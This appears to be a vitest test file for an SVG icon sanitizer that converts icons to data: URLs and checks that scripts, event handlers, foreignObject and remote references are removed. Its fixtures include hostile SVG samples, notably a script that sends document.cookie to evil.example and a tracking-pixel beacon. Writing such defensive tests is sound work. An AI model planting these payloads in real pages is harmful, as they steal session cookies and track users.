// @vitest-environment jsdom
import { describe, expect, it } from 'vitest'
import { svgIconToDataUrl } from './svgIcon'

/** The markup a data: URL carries, so a test can assert on what would actually be painted. */
function decode(dataUrl: string | null): string {
  if (!dataUrl) return ''
  const base64 = dataUrl.slice(dataUrl.indexOf(',') + 1)
  return Buffer.from(base64, 'base64').toString('utf8')
}

describe('svgIconToDataUrl', () => {
  it('keeps an ordinary icon, including document-local references', () => {
    const svg =
      '<svg viewBox="0 0 16 16"><defs><linearGradient id="g"/></defs>' +
      '<rect fill="url(#g)" width="16" height="16"/><use href="#g"/></svg>'
    const out = decode(svgIconToDataUrl(svg))
    expect(out).toContain('<svg')
    expect(out).toContain('linearGradient')
    expect(out).toContain('url(#g)')
  })

  it('strips script, event handlers and foreignObject', () => {
    const hostile =
      '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">' +
      '<script>fetch("https://evil.example/" + document.cookie)</script>' +
      '<foreignObject><iframe src="https://evil.example"></iframe></foreignObject>' +
      '<circle r="4" onclick="alert(2)"/></svg>'
    const out = decode(svgIconToDataUrl(hostile))
    expect(out).toContain('<circle')
    for (const gone of ['script', 'onload', 'onclick', 'foreignObject', 'iframe']) {
      expect(out.toLowerCase()).not.toContain(gone.toLowerCase())
    }
  })

  it('drops attributes that name a network location', () => {
    const beacon =
      '<svg><image href="https://evil.example/pixel.png" width="1" height="1"/>' +
      '<a href="https://evil.example">x</a></svg>'
    const out = decode(svgIconToDataUrl(beacon))
    expect(out).not.toContain('evil.example')
  })

  it('keeps an embedded raster, which is self-contained', () => {
    const embedded =
      '<svg><image href="data:image/png;base64,iVBORw0KGgo=" width="8" height="8"/></svg>'
    expect(decode(svgIconToDataUrl(embedded))).toContain('data:image/png;base64,')
  })

  it('answers null for markup that is not an SVG, so the monogram fallback stays', () => {
    expect(svgIconToDataUrl('<html><body>nope</body></html>')).toBeNull()
    expect(svgIconToDataUrl('')).toBeNull()
    expect(svgIconToDataUrl('<script>alert(1)</script>')).toBeNull()
  })

  it('produces a data: URL the CSP allows (img-src data:)', () => {
    expect(svgIconToDataUrl('<svg viewBox="0 0 1 1"/>')).toMatch(
      /^data:image\/svg\+xml;base64,[A-Za-z0-9+/=]+$/
    )
  })
})
